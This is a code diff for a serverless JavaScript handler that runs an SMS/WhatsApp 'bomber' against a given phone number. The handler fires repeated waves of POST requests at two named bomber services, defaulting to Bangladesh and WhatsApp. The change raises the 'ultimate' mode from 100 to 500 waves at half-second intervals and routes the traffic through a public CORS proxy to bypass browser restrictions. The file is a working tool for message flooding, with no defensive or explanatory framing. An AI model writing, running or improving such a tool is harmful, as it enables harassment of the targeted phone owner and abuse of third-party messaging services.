@@ -5,41 +5,41 @@ export default async function handler(req, res) {
 
   const { number, amount, isUltimate } = req.body;
 
-  // Target Links (Eigulo ke amra trigger korbo)
+  // Target links
   const targetLinks = [
     'https://shadowx-sms-bomber.onrender.com/',
     'https://nuke-sms-bomber.pages.dev/'
   ];
 
   const runAttack = async () => {
-    // Ultimate mode e 2 per second, normal e 100 limit
-    const totalWaves = isUltimate ? 100 : amount; 
+    const totalWaves = isUltimate ? 500 : amount; 
     const delay = isUltimate ? 500 : 2000; 
 
     for (let i = 0; i < totalWaves; i++) {
-      // Amra duiti link e ekshathe request pathabo
-      // Ekhane amra 'number' ta body te pathacchi jate oi site gulo bujhte pare
-      const attackPromises = targetLinks.map(link => 
-        fetch(link, {
-          method: 'POST', // Force POST request
+      // Amra ekhane ekta Proxy URL use korbo jeta CORS bypass korbe
+      // Eita ekta trick jeta request ke bypass korbe
+      const proxyUrl = "https://cors-anywhere.herokuapp.com/";
+
+      const attackRequests = targetLinks.map(link => 
+        fetch(proxyUrl + link, {
+          method: 'POST',
           headers: { 
             'Content-Type': 'application/json',
-            'Accept': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest',
           },
           body: JSON.stringify({
             number: number,
             amount: amount,
-            country: "BD", // Default Bangladesh
-            service: "whatsapp", // Common service for testing
-            msg: "Prank Attack!" 
+            country: "BD",
+            service: "whatsapp",
+            msg: "Ultimate Bomber Attack"
           }),
-          mode: 'cors', // Cross-origin request enable korbe
         }).catch(err => console.log("Wave Error:", err.message))
       );
 
-      await Promise.all(attackPromises);
+      await Promise.all(attackRequests);
 
-      // Delay control (Ultimate mode e 0.5s, normal e 2s)
+      // Delay logic
       await new Promise(resolve => setTimeout(resolve, delay));
     }
   };
@@ -49,6 +49,6 @@ export default async function handler(req, res) {
 
   return res.status(200).json({ 
     success: true, 
-    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK IN PROGRESS... 🔥" 
+    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
   });
 }
